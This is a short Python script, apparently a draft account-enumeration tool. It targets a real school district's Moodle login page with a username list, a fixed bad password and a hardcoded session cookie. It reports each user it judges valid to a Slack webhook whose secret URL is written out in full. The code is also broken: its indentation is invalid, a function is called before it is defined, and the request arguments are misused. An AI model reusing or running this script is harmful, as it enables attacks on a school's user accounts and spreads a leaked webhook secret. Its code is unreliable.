import requests
import sys
import getopt
from requests.auth import HTTPDigestAuth
from slack_webhook import Slack


#Slack Hook
slack = Slack(url='https://hooks.slack.com/services/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')
#slack.post(text='Hellooooo')



URL = "https://olc.stjohns.k12.fl.us/login/index.php"
userlist = open("somefile.txt","r")
user="jimmy"
badpassword ="SomethingShitty"


#incorporated whole post request but commented out required and converted to byte vs string
headers={
    #"Host: olc.stjohns.k12.fl.us",
    #"Connection: keep-alive",
    #"Content-Length: 76",
    #"Cache-Control: max-age=0",
    #"sec-ch-ua: \" Not A;Brand\";v=\"99\",\"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"",
    #"sec-ch-ua-mobile: ?0",
    #"Upgrade-Insecure-Requests: 1",
    #"Origin: https://olc.stjohns.k12.fl.us",
    #"Content-Type: application/x-www-form-urlencoded",
    b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\", Chrome/90.0.4430.212 Safari/537.36",
    #"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    #"Sec-Fetch-Site: same-origin",
    #"Sec-Fetch-Mode: navigate",
    #"Sec-Fetch-User: ?1",
    #"Sec-Fetch-Dest: document",
    #"Referer: https://olc.stjohns.k12.fl.us/login/index.php",
    #"Accept-Encoding: gzip, deflate, br",
    #"Accept-Language: en-US,en;q=0.9",
    b"Cookie: MoodleSession=tch5otu6blsu15i3s24ig2r8aq",
    }

#draft post request

for user in userlist:
    response = requests.post(URL,headers,auth=HTTPDigestAuth(user,badpassword))  
    #print(response.request.headers)
    #print(response.request.body)
    #print(response.cookies)
        if(response.is_redirect):
            message(user)

def message(valid_user):
    
    message = "%s is a valid user" % valid_user
    slack.post(text=message)

    
    

